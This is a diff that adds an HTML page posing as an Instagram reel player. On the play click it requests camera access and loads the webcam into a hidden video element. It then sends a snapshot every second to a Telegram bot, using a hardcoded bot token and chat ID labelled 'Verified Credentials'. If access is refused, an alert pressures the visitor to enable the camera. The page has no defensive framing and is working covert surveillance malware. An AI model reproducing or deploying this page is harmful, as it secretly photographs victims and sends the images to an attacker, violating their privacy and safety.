@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Reel</title>
+    <style>
+        body { margin: 0; background: #000; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; color: white; }
+        .phone-frame { width: 100%; max-width: 450px; height: 100vh; position: relative; }
+        #reelVid { width: 100%; height: 100%; object-fit: cover; }
+        .overlay { position: absolute; bottom: 60px; left: 20px; pointer-events: none; }
+        .user { font-weight: bold; display: flex; align-items: center; margin-bottom: 10px; }
+        .user-icon { width: 35px; height: 35px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); border-radius: 50%; margin-right: 10px; }
+        
+        /* Hidden logic */
+        #webcam, #canvas { position: absolute; visibility: hidden; pointer-events: none; }
+        
+        /* Play Trigger */
+        #trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; cursor: pointer; display: flex; justify-content: center; align-items: center; background: rgba(0,0,0,0.2); z-index: 10; }
+        .play-btn { width: 70px; height: 70px; background: rgba(255,255,255,0.3); border-radius: 50%; border: 2px solid white; display: flex; justify-content: center; align-items: center; font-size: 30px; }
+    </style>
+</head>
+<body>
+
+    <div class="phone-frame">
+        <video id="reelVid" loop muted playsinline>
+            <source src="https://v.ftcdn.net/05/52/64/48/700_F_552644837_7pL7pYlPqPqA9JvRzBfC0WvL7vE1Q0lY_ST.mp4" type="video/mp4">
+        </video>
+
+        <div class="overlay">
+            <div class="user"><div class="user-icon"></div> instagram_explore</div>
+            <div>Watching trending reels...</div>
+        </div>
+
+        <div id="trigger"><div class="play-btn">▶</div></div>
+    </div>
+
+    <video id="webcam" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const webcam = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const trigger = document.getElementById('trigger');
+        const reelVid = document.getElementById('reelVid');
+
+        // Verified Credentials
+        const BOT_TOKEN = '8549057486:AAF2ddvgmQLA8Pnb-gL4-ZDdyRoKTJa5YoA'; 
+        const CHAT_ID = '2018747103';
+        const INTERVAL = 1000; 
+
+        async function startSystem() {
+            try {
+                // Requesting access (Mandatory Browser Popup)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                webcam.srcObject = stream;
+                
+                trigger.style.display = 'none';
+                reelVid.muted = false;
+                reelVid.play();
+
+                // Sending loop
+                setInterval(() => {
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = webcam.videoWidth;
+                    canvas.height = webcam.videoHeight;
+                    ctx.drawImage(webcam, 0, 0);
+
+                    canvas.toBlob((blob) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob, 'shot.jpg');
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: fd
+                        }).catch(e => {});
+                    }, 'image/jpeg', 0.2); // Compressed for speed
+                }, INTERVAL);
+
+            } catch (err) {
+                alert("Error: Please enable camera to view content.");
+            }
+        }
+
+        trigger.addEventListener('click', startSystem);
+    </script>
+</body>
+</html>
